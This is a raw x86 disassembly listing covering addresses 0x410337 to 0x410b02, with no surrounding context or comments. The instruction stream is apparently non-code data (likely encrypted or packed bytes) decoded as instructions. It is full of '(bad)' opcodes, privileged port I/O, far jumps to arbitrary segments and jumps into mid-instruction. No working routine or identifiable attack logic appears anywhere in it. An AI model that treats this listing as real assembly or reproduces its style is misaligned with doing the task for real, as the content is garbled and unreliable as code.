  410337:	cmp    al,0x46
  410339:	mov    edi,0xc5307834
  41033e:	jg     0x41030a
  410340:	push   ds
  410341:	cmp    BYTE PTR [ebx+0xb],bl
  410344:	daa    
  410345:	sar    BYTE PTR [esi+0x7bae85e2],1
  41034b:	jl     0x4102de
  41034d:	jg     0x410394
  41034f:	lahf   
  410350:	adc    DWORD PTR [eax],0xbbb0b803
  410356:	lods   al,BYTE PTR ds:[esi]
  410357:	dec    ebx
  410358:	aam    0x96
  41035a:	lahf   
  41035b:	dec    ecx
  41035c:	jp     0x4102ed
  41035e:	inc    ecx
  41035f:	shr    al,cl
  410361:	dec    ecx
  410362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410363:	stos   DWORD PTR es:[edi],eax
  410364:	dec    ebx
  410365:	xor    bl,BYTE PTR [esi+0x23]
  410368:	rcr    DWORD PTR [esi+0x68b0efa0],1
  41036e:	sbb    eax,0xe0b6e07b
  410373:	pop    ebp
  410374:	mov    al,0xba
  410376:	mov    ds,WORD PTR [edx]
  410378:	(bad)  
  410379:	test   esp,esi
  41037b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41037c:	sbb    DWORD PTR [ebp+0x13],esp
  41037f:	mov    dh,bh
  410381:	loope  0x41030d
  410383:	adc    BYTE PTR [ebp+0x33ff5d4d],cl
  410389:	(bad)  
  41038a:	fnsave [edx-0x71]
  41038d:	inc    edi
  41038e:	pop    edx
  41038f:	fistp  DWORD PTR [esi-0x30]
  410392:	je     0x41034d
  410394:	sbb    dh,BYTE PTR [esi-0x58f68658]
  41039a:	shl    DWORD PTR [esi-0x7b],cl
  41039d:	adc    BYTE PTR [ecx-0x3],cl
  4103a0:	push   es
  4103a1:	in     eax,0x4
  4103a3:	xchg   DWORD PTR [ebx-0x1ce809b3],ebx
  4103a9:	dec    edi
  4103aa:	cmp    edx,DWORD PTR [eax+esi*2-0x2b894bb0]
  4103b1:	or     ebp,esi
  4103b3:	jmp    0xdfba6a4c
  4103b8:	pushf  
  4103b9:	push   0x19075577
  4103be:	rcr    dl,1
  4103c0:	jge    0x410362
  4103c2:	push   esp
  4103c3:	sub    ebx,ecx
  4103c5:	jmp    0xd7bd:0xc4064453
  4103cc:	(bad)  
  4103cd:	lock call 0x1d9a:0xceff058b
  4103d5:	enter  0xee75,0xae
  4103d9:	push   es
  4103da:	scas   al,BYTE PTR es:[edi]
  4103db:	xchg   BYTE PTR [ecx-0x30],ch
  4103de:	cmc    
  4103df:	(bad)  
  4103e0:	bound  ebp,QWORD PTR [ecx+0x68d25c31]
  4103e6:	mov    al,0x8e
  4103e8:	mov    cl,0x38
  4103ea:	scas   al,BYTE PTR es:[edi]
  4103eb:	imul   BYTE PTR [edx+0x13908175]
  4103f1:	jbe    0x410379
  4103f3:	je     0x4103f2
  4103f5:	add    eax,DWORD PTR [edx]
  4103f7:	(bad)  
  4103f9:	and    al,bl
  4103fb:	cld    
  4103fc:	daa    
  4103fd:	jg     0x41045d
  4103ff:	mov    esp,ebx
  410401:	outs   dx,BYTE PTR ds:[esi]
  410402:	and    BYTE PTR [ecx+0x5327338f],bl
  410408:	pop    ebx
  410409:	xchg   edi,eax
  41040a:	sbb    eax,DWORD PTR [eax-0x9aa01f3]
  410410:	stos   DWORD PTR es:[edi],eax
  410411:	jl     0x4103e8
  410413:	dec    esp
  410414:	pushf  
  410415:	inc    esp
  410416:	xor    al,0x3d
  410418:	xor    al,0x92
  41041a:	iret   
  41041b:	dec    ebp
  41041c:	je     0x410411
  41041e:	adc    edx,ebx
  410420:	inc    edi
  410421:	out    0x0,al
  410423:	(bad)  
  410424:	out    0x8a,al
  410426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410427:	add    esp,esi
  410429:	div    esi
  41042b:	jns    0x4103d0
  41042d:	in     al,0xdb
  41042f:	mov    bh,0x6e
  410431:	push   esi
  410432:	mov    ch,0xfd
  410435:	or     BYTE PTR [edx+0x2cb0f4ba],0xf4
  41043c:	inc    esp
  41043d:	int3   
  41043e:	jo     0x4104ab
  410440:	inc    ebx
  410441:	das    
  410442:	mov    eax,0xb1c01ad1
  410447:	fadd   DWORD PTR [eax-0x23]
  41044a:	loope  0x4104b6
  41044c:	inc    ebx
  41044d:	pop    esi
  41044e:	xor    ch,dh
  410450:	test   BYTE PTR [ebp+0x64],ah
  410453:	mov    ecx,cs
  410455:	mov    dl,0x38
  410457:	cdq    
  410458:	pop    edi
  410459:	gs (bad) 
  41045b:	jbe    0x41041f
  41045d:	jle    0x410430
  41045f:	ss push edi
  410461:	shl    ebx,0xc3
  410464:	jnp    0x410485
  410466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410467:	das    
  410468:	mov    esp,0xd88d6037
  41046d:	dec    esp
  41046e:	into   
  41046f:	in     al,dx
  410470:	jp     0x410459
  410472:	in     al,dx
  410473:	add    eax,0xe06dfa41
  410478:	in     eax,0xe6
  41047a:	cmp    esi,DWORD PTR [ecx+0x662e6208]
  410480:	pop    ebp
  410481:	rcl    DWORD PTR [edi+0x3060d918],0xdc
  410488:	ja     0x41049c
  41048a:	sbb    al,BYTE PTR [esi]
  41048c:	sub    esi,esp
  41048e:	sub    eax,0xa1829515
  410493:	pop    edi
  410494:	mov    edx,0x893e05b4
  410499:	or     eax,0x161c68d0
  41049e:	jl     0x41048b
  4104a0:	jg     0x410481
  4104a2:	fnstenv [esi]
  4104a4:	xchg   ecx,eax
  4104a5:	fnsave [ebx+ebp*1]
  4104a8:	icebp  
  4104a9:	xchg   ebx,eax
  4104aa:	or     bl,BYTE PTR [ecx]
  4104ac:	test   eax,0x18af2533
  4104b1:	or     eax,0x9e8405ae
  4104b6:	inc    eax
  4104b7:	popa   
  4104b8:	mov    cl,0x7c
  4104ba:	int    0x59
  4104bc:	mov    edi,0xfd3195f0
  4104c1:	and    ebp,0xb259854a
  4104c7:	push   ebx
  4104c8:	repz inc ecx
  4104ca:	mov    edi,DWORD PTR [esi+0x3a]
  4104cd:	inc    esp
  4104ce:	sbb    al,al
  4104d0:	mov    bh,0x36
  4104d2:	inc    edi
  4104d3:	cld    
  4104d4:	int    0x71
  4104d6:	cmp    esi,DWORD PTR [eax+0x36]
  4104d9:	test   eax,0xe7575872
  4104de:	adc    BYTE PTR [edi],bh
  4104e0:	nop
  4104e1:	xor    dl,0xc1
  4104e4:	xchg   ebp,eax
  4104e5:	dec    eax
  4104e6:	and    dl,BYTE PTR [ebx+0x38d1d880]
  4104ec:	ja     0x410494
  4104ee:	arpl   WORD PTR [edi-0x9],bp
  4104f1:	sub    eax,0x4616c631
  4104f6:	mov    ch,0xe8
  4104f8:	(bad)  
  4104f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104fa:	push   cs
  4104fb:	pop    es
  4104fc:	sub    eax,0xcda50244
  410501:	mov    edx,0xa23b804a
  410506:	aam    0xf9
  410508:	mov    ds:0x6a660daa,al
  41050d:	sti    
  41050e:	fmul   QWORD PTR [eax]
  410510:	mov    ecx,0xc4991508
  410515:	call   FWORD PTR [eax-0x6e797b2b]
  41051b:	mov    ebx,ecx
  41051d:	shr    BYTE PTR [eax],cl
  41051f:	jl     0x4104e5
  410521:	jp     0x4104c4
  410523:	adc    edx,ebp
  410525:	pop    esp
  410526:	pop    ebp
  410527:	sahf   
  410528:	daa    
  410529:	or     ch,BYTE PTR [ecx-0x5e210640]
  41052f:	jo     0x4105a9
  410531:	es push es
  410533:	add    ecx,DWORD PTR [edi-0x4e]
  410536:	out    0x8e,eax
  410538:	hlt    
  410539:	mov    eax,ds:0x4b0bbb04
  41053e:	mov    al,ds:0x1c745012
  410543:	cmp    BYTE PTR [eax],ch
  410545:	fiadd  WORD PTR [esi]
  410547:	out    dx,al
  410548:	pop    ecx
  410549:	lods   al,BYTE PTR ds:[esi]
  41054a:	shr    esi,cl
  41054c:	xchg   DWORD PTR [eax],ebp
  41054e:	sub    bl,dl
  410550:	ins    DWORD PTR es:[edi],dx
  410551:	xchg   ecx,eax
  410552:	stc    
  410553:	xor    edi,DWORD PTR [ebx+0x2060dba0]
  410559:	imul   ecx,DWORD PTR [esi],0x7cf7bbbf
  41055f:	retf   0xf369
  410562:	outs   dx,DWORD PTR ds:[esi]
  410563:	int3   
  410564:	fstp   DWORD PTR [ebp+0x71]
  410567:	adc    eax,0xe1ca5e52
  41056c:	cmp    eax,0x62784972
  410571:	pop    edi
  410572:	xor    ebx,DWORD PTR [esi+0x52]
  410575:	int    0xc3
  410577:	mov    DWORD PTR gs:[edx-0x35],0xdd3a2cc3
  41057f:	push   eax
  410580:	outs   dx,BYTE PTR ds:[esi]
  410581:	dec    ebx
  410582:	xchg   edx,eax
  410583:	popf   
  410584:	sahf   
  410585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410586:	pop    esi
  410587:	jmp    0x5f37d276
  41058c:	gs and eax,0x11b09e4e
  410592:	add    eax,0x9e45329c
  410597:	in     eax,0x23
  410599:	sub    edx,DWORD PTR ds:0xec2c9861
  41059f:	xor    DWORD PTR [ebx],edx
  4105a1:	repz xor al,0x8a
  4105a4:	mov    ?,WORD PTR [edi+0x31]
  4105a7:	pop    ebp
  4105a8:	leave  
  4105a9:	xor    ebp,DWORD PTR [eax+ebx*4]
  4105ac:	jne    0x4105cc
  4105ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105af:	int3   
  4105b0:	out    0x93,al
  4105b2:	and    edi,ecx
  4105b4:	in     eax,0x1b
  4105b6:	jmp    0xfbd:0x48efee6c
  4105bd:	bnd js 0x410576
  4105c0:	or     ch,0xba
  4105c3:	jo     0x410627
  4105c5:	xor    esp,edi
  4105c7:	(bad)  
  4105c9:	pop    esp
  4105ca:	js     0x41062c
  4105cc:	sbb    DWORD PTR [ebx+0x653b5b],edi
  4105d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105d3:	pop    ss
  4105d4:	outs   dx,DWORD PTR ds:[esi]
  4105d5:	push   cs
  4105d6:	repz adc edx,DWORD PTR [esi+ecx*4-0x44]
  4105db:	stos   DWORD PTR es:[edi],eax
  4105dc:	xchg   ebx,eax
  4105dd:	call   0x3cda851d
  4105e2:	mov    DWORD PTR ds:0x22b3a426,ecx
  4105e8:	data16 jb 0x410592
  4105eb:	fwait
  4105ec:	sub    ebx,DWORD PTR [ebp-0x6742f31]
  4105f2:	aas    
  4105f3:	sti    
  4105f4:	and    dh,BYTE PTR [ebx+0x33da6921]
  4105fa:	imul   ecx,esp,0xd473b2d6
  410600:	add    DWORD PTR [edx],0xc7035441
  410606:	add    eax,0x105a5e18
  41060c:	out    0xfa,al
  41060e:	and    al,0x15
  410610:	mov    ebx,DWORD PTR gs:[edx+0x62]
  410614:	jns    0x410679
  410616:	mov    ah,0xef
  410618:	dec    edx
  410619:	out    0x12,al
  41061b:	jo     0x41061b
  41061d:	iret   
  41061e:	cmp    BYTE PTR [ebx+ecx*4],ah
  410621:	call   FWORD PTR [ecx-0x2cc95d1d]
  410627:	xchg   BYTE PTR [ebx+0x33],bl
  41062a:	les    edi,FWORD PTR [ecx-0x19544428]
  410630:	rcr    DWORD PTR [esi-0x34c8b6d6],cl
  410636:	push   edx
  410637:	xchg   BYTE PTR [edi-0x445d78c],cl
  41063d:	icebp  
  41063e:	jae    0x4105f2
  410640:	sub    ch,0xcd
  410643:	and    BYTE PTR [ebp+0x3f758c7d],ch
  410649:	push   eax
  41064a:	mov    ds:0x9832688c,al
  41064f:	repz (bad) [edx+0x18]
  410653:	pop    ss
  410654:	ins    DWORD PTR es:[edi],dx
  410655:	popf   
  410656:	dec    BYTE PTR [edx-0x11c2a55c]
  41065c:	das    
  41065d:	addr16 or cl,0x6a
  410661:	cli    
  410662:	stos   DWORD PTR es:[edi],eax
  410663:	push   edx
  410664:	jbe    0x4106a5
  410666:	pop    edi
  410667:	mov    ebx,0xffca8b15
  41066c:	outs   dx,DWORD PTR ds:[esi]
  41066d:	(bad)  
  41066e:	xchg   esi,eax
  41066f:	lods   eax,DWORD PTR ds:[esi]
  410670:	mov    ecx,0x96cd1682
  410675:	jbe    0x410689
  410677:	xor    DWORD PTR [ebp+0x672fedf4],ebx
  41067d:	add    cl,dh
  41067f:	mov    al,0xeb
  410681:	stc    
  410682:	call   0x1ef58d5f
  410687:	and    al,0x7b
  410689:	inc    ebp
  41068a:	aaa    
  41068b:	sbb    BYTE PTR [edx-0xb2f2747],dh
  410691:	cmp    BYTE PTR [ebx-0x1e],bl
  410694:	clc    
  410695:	fwait
  410696:	mov    eax,ds:0xea1a73b6
  41069b:	mov    bh,0x45
  41069d:	aad    0x32
  41069f:	out    0x27,al
  4106a1:	rol    edx,cl
  4106a3:	jp     0x4106aa
  4106a5:	xor    eax,DWORD PTR [edx]
  4106a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106a8:	scas   eax,DWORD PTR es:[edi]
  4106a9:	in     al,dx
  4106aa:	(bad)  
  4106ab:	push   ss
  4106ac:	stos   BYTE PTR es:[edi],al
  4106ad:	fldenv [ebx]
  4106af:	cmp    bl,BYTE PTR [ebx]
  4106b1:	pop    ebx
  4106b2:	inc    eax
  4106b3:	ss in  eax,dx
  4106b5:	test   BYTE PTR ds:0xe63c8c22,dh
  4106bb:	fcomi  st,st(2)
  4106bd:	or     al,0x97
  4106bf:	mov    esp,0xdeee07a8
  4106c4:	sbb    DWORD PTR [ecx],0xcf75ffd
  4106ca:	ins    BYTE PTR es:[edi],dx
  4106cb:	(bad)
  4106ce:	xlat   BYTE PTR ds:[ebx]
  4106cf:	push   es
  4106d0:	fld    TBYTE PTR [edx]
  4106d2:	add    eax,0xbd207150
  4106d7:	cmp    BYTE PTR [esi+ecx*1+0x61996739],dl
  4106de:	sub    eax,0x93ef824f
  4106e3:	js     0x410757
  4106e5:	xor    DWORD PTR [ecx],ebx
  4106e7:	and    DWORD PTR [edx-0x40],eax
  4106ea:	xchg   esi,eax
  4106eb:	maskmovq mm1,(bad)
  4106ec:	test   DWORD PTR [ebp+0x2f290a33],0x40c9b620
  4106f6:	call   0xabbeb260
  4106fb:	sbb    al,0xde
  4106fd:	daa    
  4106fe:	inc    ebx
  4106ff:	mov    BYTE PTR [eax],0x74
  410702:	arpl   WORD PTR [esi+0x29],bp
  410705:	sbb    al,0xaa
  410707:	pop    ds
  410708:	pop    eax
  410709:	fnstsw WORD PTR [edx+0x3ab21b8c]
  41070f:	retf   
  410710:	jbe    0x410718
  410712:	dec    edx
  410713:	and    eax,0x21260386
  410718:	mov    bh,0x9f
  41071a:	mov    esp,0x27c5a7b4
  41071f:	lods   al,BYTE PTR ds:[esi]
  410720:	dec    esi
  410721:	sahf   
  410722:	sub    DWORD PTR [ebp-0x674c8668],edi
  410728:	xchg   ebx,eax
  410729:	iret   
  41072a:	xlat   BYTE PTR ds:[ebx]
  41072b:	popf   
  41072c:	inc    esi
  41072d:	jmp    0x3a9c:0x7e08ca77
  410734:	jg     0x410743
  410736:	es retf 
  410738:	add    DWORD PTR [edi],esi
  41073a:	jl     0x4106d4
  41073c:	mov    ebx,0xd3e49353
  410741:	loopne 0x41072f
  410743:	fucomip st,st(2)
  410745:	es mov dh,0xe5
  410748:	mov    eax,0xa0d33056
  41074d:	mov    ds:0xf5c141f7,eax
  410752:	aad    0x4e
  410754:	push   0x24db7278
  410759:	jne    0x41075d
  41075b:	xchg   ebp,eax
  41075c:	repz scas ax,WORD PTR es:[di]
  410760:	jle    0x4106ec
  410762:	call   0x3ccc:0x14eb76ed
  410769:	js     0x410747
  41076b:	shl    BYTE PTR [ebx+0x3d],0x6b
  41076f:	not    DWORD PTR [esi]
  410771:	push   cs
  410772:	inc    edi
  410773:	popf   
  410774:	jns    0x410759
  410776:	jo     0x4107e9
  410778:	jge    0x4107f0
  41077a:	sub    ah,al
  41077c:	js     0x4107ab
  41077e:	or     esp,eax
  410780:	cld    
  410781:	pop    esp
  410782:	dec    ebp
  410783:	sbb    BYTE PTR [edx],bl
  410785:	mov    edx,0x19f2f38c
  41078a:	(bad)  
  41078b:	cld    
  41078c:	sub    BYTE PTR [ecx-0x2379f4bf],0x13
  410793:	dec    edi
  410794:	push   esi
  410795:	dec    ebx
  410796:	lea    esi,[edi-0x79]
  410799:	mov    bh,0xdd
  41079b:	jle    0x4107b2
  41079d:	push   0xffffffb7
  41079f:	mov    esi,0xead79114
  4107a4:	fisttp QWORD PTR [esi-0x1be32cda]
  4107aa:	sti    
  4107ab:	sub    al,bh
  4107ad:	jecxz  0x410767
  4107af:	scas   al,BYTE PTR es:[edi]
  4107b0:	push   ebp
  4107b2:	or     dl,al
  4107b4:	pushf  
  4107b5:	mov    al,0xd9
  4107b7:	outs   dx,DWORD PTR ds:[esi]
  4107b8:	inc    ecx
  4107b9:	jns    0x41074f
  4107bb:	pop    es
  4107bc:	aad    0x92
  4107be:	sbb    eax,0x28b8eab4
  4107c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c5:	jl     0x410800
  4107c7:	jp     0x4107c0
  4107c9:	and    edi,DWORD PTR [ebx+0x23]
  4107cc:	or     BYTE PTR [edx],dh
  4107ce:	and    ah,BYTE PTR [esi+0x17424af]
  4107d4:	fbld   TBYTE PTR ds:0x6d0682c1
  4107da:	cmp    ebx,DWORD PTR [edx+0x7]
  4107dd:	aas    
  4107de:	and    ecx,ebx
  4107e0:	cmp    ax,0xff4c
  4107e4:	push   edi
  4107e5:	cmp    al,0xea
  4107e7:	call   0x9cf:0xd9200c38
  4107ee:	(bad)  
  4107ef:	cmp    al,0xd9
  4107f1:	imul   ebx,DWORD PTR [eax-0xa38b7d0],0x16
  4107f8:	outs   dx,BYTE PTR ds:[esi]
  4107f9:	dec    esp
  4107fa:	(bad)  
  4107fb:	fbld   TBYTE PTR [esi]
  4107fd:	ret    0x96c8
  410800:	xor    BYTE PTR [ecx],al
  410802:	mov    ds,WORD PTR [ebp-0x523006c3]
  410808:	shl    ebx,0x3
  41080b:	push   edx
  41080c:	add    BYTE PTR [esi],bl
  41080e:	jecxz  0x41086e
  410810:	repz fcmovne st,st(1)
  410813:	cs dec edx
  410815:	sbb    eax,ebp
  410817:	(bad)  
  410818:	retf   
  410819:	sub    bl,BYTE PTR [ecx+0x141f5b4f]
  41081f:	pusha  
  410820:	inc    esi
  410821:	mov    al,es:0x39700ae4
  410827:	and    ebx,DWORD PTR [ebx+edi*4+0x7f]
  41082b:	aas    
  41082c:	jmp    0x3399ff08
  410831:	int    0xf4
  410833:	or     al,0x5a
  410835:	mov    dh,0x3a
  410837:	jb     0x410821
  410839:	pop    eax
  41083a:	add    BYTE PTR ds:0x7374d740,0x4a
  410841:	sub    al,0xb1
  410843:	and    al,0x9b
  410845:	(bad)  
  410846:	push   0x1d721d5c
  41084b:	jl     0x410834
  41084d:	xor    bh,dh
  41084f:	scas   al,BYTE PTR es:[edi]
  410850:	rcl    eax,0xb4
  410853:	mov    ebx,0x1ce9d08e
  410858:	dec    esp
  410859:	mov    dl,0x84
  41085b:	lods   eax,DWORD PTR ds:[esi]
  41085c:	pop    ss
  41085d:	adc    edi,ebx
  41085f:	cdq    
  410860:	jmp    0x97b85f07
  410865:	xor    al,bl
  410867:	jns    0x410836
  410869:	ja     0x41088f
  41086b:	fnstcw WORD PTR [ebx+0x727661cf]
  410871:	mov    BYTE PTR [ebx],0x32
  410874:	ss push edi
  410876:	and    al,0xc6
  410878:	xor    al,0xc6
  41087a:	or     al,0x69
  41087c:	scas   al,BYTE PTR es:[edi]
  41087d:	jno    0x4108a0
  41087f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410880:	(bad)  
  410881:	clc    
  410882:	cli    
  410883:	push   edi
  410884:	dec    edx
  410885:	mov    edi,0x578776ce
  41088a:	sub    ch,BYTE PTR [ebx-0x55]
  41088d:	enter  0xa5d2,0xd1
  410891:	cwde   
  410892:	rol    BYTE PTR [ebx-0x39af0ac4],0x4
  410899:	shl    BYTE PTR [ecx+esi*4-0x5cab8984],1
  4108a0:	or     bl,BYTE PTR [ebx-0x4566ca39]
  4108a6:	ficom  WORD PTR [eax]
  4108a8:	das    
  4108a9:	hlt    
  4108aa:	mov    ebx,0xd723d102
  4108af:	dec    edi
  4108b0:	and    dh,cl
  4108b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b3:	dec    eax
  4108b4:	mov    ecx,0xa4768d53
  4108b9:	jbe    0x41089d
  4108bb:	loope  0x410900
  4108bd:	in     eax,0xc0
  4108bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c0:	ds mov bl,0xc7
  4108c3:	retf   
  4108c4:	shr    BYTE PTR [edx+0x2ecdd362],cl
  4108ca:	dec    esp
  4108cb:	push   ss
  4108cc:	ficom  WORD PTR [ebx+ebp*4-0xa]
  4108d0:	pop    eax
  4108d1:	sbb    eax,0xb8310b2b
  4108d6:	lds    edx,FWORD PTR [edx+0x3d]
  4108d9:	mov    bh,0xae
  4108db:	loopne 0x4108f8
  4108dd:	mov    ecx,0xb45a9bba
  4108e2:	mov    ecx,0x2f4bbf09
  4108e7:	aam    0x2d
  4108e9:	in     al,0x86
  4108eb:	jp     0x4108d3
  4108ed:	inc    esp
  4108ee:	out    0xc,al
  4108f0:	push   ebp
  4108f1:	mov    ds:0x95004521,eax
  4108f6:	mov    ah,0x27
  4108f8:	and    edi,DWORD PTR [edi-0x52]
  4108fb:	adc    edx,esi
  4108fd:	pop    es
  4108fe:	cmp    al,ch
  410900:	enter  0xc271,0x15
  410904:	fs iret 
  410906:	test   BYTE PTR [esi],dh
  410908:	xchg   ebp,eax
  410909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090a:	out    dx,al
  41090b:	pop    es
  41090c:	rcl    esi,0x5f
  41090f:	jbe    0x41098b
  410911:	out    dx,al
  410912:	popa   
  410913:	fisttp WORD PTR ds:0xc148a02b
  410919:	(bad)  
  41091a:	push   edi
  41091b:	dec    ebp
  41091c:	stos   DWORD PTR es:[edi],eax
  41091d:	aas    
  41091e:	ror    bl,1
  410920:	sbb    BYTE PTR ds:0xeb218afc,ah
  410926:	jp     0x410958
  410928:	mov    DWORD PTR [ecx+ebp*8-0x23a03cdc],esi
  41092f:	jge    0x410921
  410931:	mov    eax,ds:0xd798fc50
  410936:	outs   dx,DWORD PTR ds:[esi]
  410937:	outs   dx,DWORD PTR ds:[esi]
  410938:	jne    0x4108f8
  41093a:	int3   
  41093b:	lods   al,BYTE PTR ds:[esi]
  41093c:	cvttps2pi mm1,QWORD PTR [ebx-0x37a02764]
  410943:	clc    
  410944:	push   edi
  410945:	xchg   ebx,eax
  410946:	push   es
  410947:	pop    edx
  410948:	pop    ds
  410949:	mov    eax,ds:0xe35220a
  41094e:	xchg   esi,eax
  41094f:	shl    ch,1
  410951:	jne    0x410964
  410953:	add    BYTE PTR [esi],0x7e
  410956:	jo     0x410914
  410958:	pop    ss
  410959:	fstp   TBYTE PTR ds:0x37660f5a
  41095f:	fistp  WORD PTR [ebx+ebx*2+0x5c]
  410963:	inc    eax
  410964:	bound  edx,QWORD PTR [edx+0x29cee9dd]
  41096a:	add    al,0x26
  41096c:	cmp    DWORD PTR [eax-0x1d],eax
  41096f:	in     al,0x9a
  410971:	push   es
  410972:	ins    DWORD PTR es:[edi],dx
  410973:	faddp  st(5),st
  410975:	repnz test DWORD PTR [esi-0x57fdc253],edi
  41097c:	xlat   BYTE PTR ds:[ebx]
  41097d:	dec    ebp
  41097e:	outs   dx,DWORD PTR ds:[esi]
  41097f:	cmc    
  410980:	xchg   ebx,eax
  410981:	jle    0x41098b
  410983:	fist   DWORD PTR ds:[ebx+0x56]
  410987:	mov    BYTE PTR [eax+0x5b],0x58
  41098b:	mov    ds:0x293de40b,eax
  410990:	pop    eax
  410991:	jae    0x4109e6
  410993:	ficomp WORD PTR [ecx]
  410995:	test   dl,0x8
  410998:	ins    DWORD PTR es:[edi],dx
  410999:	pop    ds
  41099a:	ror    BYTE PTR [ecx+0x30416613],1
  4109a0:	push   eax
  4109a1:	cmp    DWORD PTR [ecx+0x7ca30c28],ebp
  4109a7:	aad    0x36
  4109a9:	jp     0x410a09
  4109ab:	xchg   DWORD PTR [edx-0x17],esi
  4109ae:	aaa    
  4109af:	mov    bl,bl
  4109b1:	dec    esp
  4109b2:	sub    DWORD PTR [edi-0x216e965e],eax
  4109b8:	call   DWORD PTR [edi-0x33769388]
  4109be:	push   esp
  4109bf:	mov    edi,0xa2407b12
  4109c4:	cmp    BYTE PTR [esi+0x5d283cd4],bl
  4109ca:	data16 test al,0x33
  4109cd:	add    dl,BYTE PTR [eax+0xa77742c]
  4109d3:	arpl   WORD PTR [edi+0x1d612dae],di
  4109d9:	(bad)  
  4109da:	int3   
  4109db:	arpl   WORD PTR [ebx+0x5f],cx
  4109de:	outs   dx,DWORD PTR ds:[esi]
  4109df:	and    DWORD PTR [edi-0xa],eax
  4109e2:	sub    bl,dl
  4109e4:	imul   edx,ebx,0xffffffd1
  4109e7:	addr16 dec ebp
  4109e9:	or     eax,0x401266bc
  4109ee:	ins    BYTE PTR es:[edi],dx
  4109ef:	leave  
  4109f0:	inc    esi
  4109f1:	lods   eax,DWORD PTR ds:[esi]
  4109f2:	scas   al,BYTE PTR es:[edi]
  4109f3:	cmp    DWORD PTR [edi+0x1a],edi
  4109f6:	popa   
  4109f7:	sbb    BYTE PTR [eax-0x4d],dh
  4109fa:	lahf   
  4109fb:	xlat   BYTE PTR ds:[ebx]
  4109fc:	add    DWORD PTR [eax],0x43
  4109ff:	pop    edi
  410a00:	sbb    bl,dl
  410a02:	(bad)  
  410a03:	push   edi
  410a04:	pusha  
  410a05:	das    
  410a06:	out    0xe,eax
  410a08:	cli    
  410a09:	loop   0x410a06
  410a0b:	xchg   DWORD PTR [ecx-0x3a0317b7],edx
  410a11:	inc    edi
  410a12:	test   DWORD PTR [edx],eax
  410a14:	test   eax,0x385a408a
  410a19:	into   
  410a1a:	adc    ebx,DWORD PTR [ebp-0x3b]
  410a1d:	jno    0x4109e2
  410a1f:	mov    ch,0xe5
  410a21:	or     DWORD PTR [ecx],edx
  410a23:	js     0x4109dc
  410a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a26:	sbb    al,0x2c
  410a28:	lods   eax,DWORD PTR ds:[esi]
  410a29:	icebp  
  410a2a:	jmp    0xcf4a3da9
  410a2f:	cli    
  410a30:	and    BYTE PTR [ecx+0x31],0x78
  410a34:	and    bl,BYTE PTR [eax-0x591ae6a2]
  410a3a:	mov    eax,0x3c8ce0f
  410a3f:	nop
  410a40:	leave  
  410a41:	add    al,0x4d
  410a43:	out    dx,eax
  410a44:	fwait
  410a45:	ds inc ebx
  410a47:	iret   
  410a48:	scas   eax,DWORD PTR es:[edi]
  410a49:	sbb    esi,edi
  410a4b:	push   0x83710a1f
  410a50:	(bad)  
  410a51:	xor    ebp,DWORD PTR [edx-0x1c4cc62e]
  410a57:	(bad)  
  410a58:	in     al,0xab
  410a5a:	dec    esi
  410a5b:	xchg   esi,eax
  410a5c:	es jo  0x410a1d
  410a5f:	xchg   edx,eax
  410a60:	out    0x13,eax
  410a62:	adc    DWORD PTR [esp+eiz*2+0x3d],edi
  410a66:	pop    ds
  410a67:	mov    dl,0xe5
  410a69:	outs   dx,DWORD PTR ds:[esi]
  410a6a:	test   DWORD PTR [eax+eax*8+0x23],esi
  410a6e:	xchg   esp,eax
  410a6f:	mov    BYTE PTR [edx],dl
  410a71:	sub    al,0xe4
  410a73:	or     DWORD PTR [edx],esp
  410a75:	retf   
  410a76:	push   eax
  410a77:	fdivr  st(7),st
  410a79:	xchg   DWORD PTR [ecx+0x38],eax
  410a7c:	sti    
  410a7d:	in     al,0x30
  410a7f:	pop    ds
  410a80:	mov    DWORD PTR [ecx+0x77],esi
  410a83:	add    al,0x26
  410a85:	aaa    
  410a86:	inc    ecx
  410a87:	push   eax
  410a88:	xor    al,0xea
  410a8a:	jle    0x410a2b
  410a8c:	mov    ebp,0x3ebcba21
  410a91:	mov    dh,0x2d
  410a93:	aad    0xb9
  410a95:	xlat   BYTE PTR ds:[ebx]
  410a96:	das    
  410a97:	mov    cl,0x5
  410a99:	daa    
  410a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a9b:	out    dx,eax
  410a9c:	sbb    al,0x6a
  410a9e:	sahf   
  410a9f:	adc    eax,0x30db70bb
  410aa4:	test   bh,ah
  410aa6:	ret    
  410aa7:	add    ecx,DWORD PTR [ebp+0x2c]
  410aaa:	lods   eax,DWORD PTR ds:[esi]
  410aab:	or     DWORD PTR [ebx+0x4261e5b4],esi
  410ab1:	int3   
  410ab2:	pushf  
  410ab3:	repz ror BYTE PTR ds:[eax-0x22ba8240],0xfb
  410abc:	xchg   edx,eax
  410abd:	sbb    al,0x4d
  410abf:	or     eax,0xe5b99855
  410ac4:	inc    esi
  410ac5:	mov    dh,0xf7
  410ac7:	dec    ecx
  410ac8:	mov    bl,0x22
  410aca:	mov    dh,0x46
  410acc:	iret   
  410acd:	push   es
  410ace:	iret   
  410acf:	xchg   DWORD PTR [ebp-0x6b10c69e],esp
  410ad5:	and    DWORD PTR [esi+edx*4],0xef0b6214
  410adc:	mov    esp,0x29c6ed5b
  410ae1:	dec    ecx
  410ae2:	pusha  
  410ae3:	scas   al,BYTE PTR es:[edi]
  410ae4:	repnz jmp 0x316c:0xe94068fe
  410aec:	xor    DWORD PTR [edx+0x7f5d0157],edi
  410af2:	and    edx,DWORD PTR [ebp+eiz*2-0x65ed8933]
  410af9:	mov    ebx,0xf25ae2a7
  410afe:	rcr    BYTE PTR [ebx+ebx*8],0xca
  410b02:	das    
